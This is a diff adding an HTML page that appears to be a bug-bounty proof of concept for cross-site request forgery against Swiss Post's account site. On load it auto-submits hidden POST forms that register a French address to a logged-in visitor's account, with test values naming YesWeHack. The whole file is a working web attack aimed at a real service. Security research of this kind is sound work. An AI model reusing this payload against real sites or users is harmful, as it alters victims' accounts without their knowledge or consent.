@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Envoyer des Requêtes POST</title>
+    
+
+    <script>
+        function sendRequests() {
+            // Envoie du premier formulaire
+            setTimeout(() => {
+                document.getElementById('form1').submit();
+            }, 1000); // Attendre 100ms avant de soumettre le deuxième formulaire
+        }
+
+            // Envoie du deuxième formulaire immédiatement après
+            setTimeout(() => {
+                document.getElementById('form2').submit();
+            }, 1430); // Attendre 100ms avant de soumettre le deuxième formulaire
+        
+
+        window.onload = function() {
+            sendRequests();
+        }
+    </script>
+</head>
+<body>
+    <h1>Envoyer les deux requêtes POST</h1>
+    <img src="https://account.post.ch/selfadmin/account-management/address-management/address/registration/">
+
+    <!-- Premier formulaire avec les données spécifiques -->
+    <form id="form1" action="https://account.post.ch/selfadmin/account-management/address-management/address/registration/" method="POST">
+        <input type="hidden" name="internal" value="true">
+        <input type="hidden" name="dashboard" value="false">
+        <input type="hidden" name="service" value="klp">
+        <input type="hidden" name="lang" value="fr">
+        <input type="hidden" name="inIframe" value="false">
+        <input type="hidden" name="inMobileApp" value="false">
+        <input type="hidden" name="targetURL" value="https://www.post.ch/api/OnlineServiceRedirect?serviceId=portal-delivery&environment=Prod">
+        <input type="hidden" name="abortURL" value="https://www.post.ch/">
+        <input type="hidden" name="countryIso" value="FR">
+        <input type="hidden" name="sex" value="M">
+        <input type="hidden" name="firstName" value="Kaihoq">
+        <input type="hidden" name="lastName" value="TEST YesWeHack">
+        <input type="hidden" name="foreignRow1" value="20 rue de Bezons BugBounty">
+        <input type="hidden" name="foreignRow2" value="">
+        <input type="hidden" name="foreignRow3" value="">
+        <input type="hidden" name="foreignRow4" value="">
+        <input type="hidden" name="zip" value="92400">
+        <input type="hidden" name="town" value="Courbevoie">
+        <input type="hidden" name="customerAccountType" value="B2C">
+    </form>
+
+    <!-- Deuxième formulaire pour la seconde requête POST -->
+    <form id="form2" action="https://account.post.ch/selfadmin/account-management/address-management/address/registration/" method="POST">
+        <input type="hidden" name="mutationConfirmation" value="">
+    </form>
+
+    <!-- Bouton pour envoyer les deux requêtes -->
+    <button onclick="sendRequests()">Envoyer les deux requêtes</button>
+</body>
+</html>
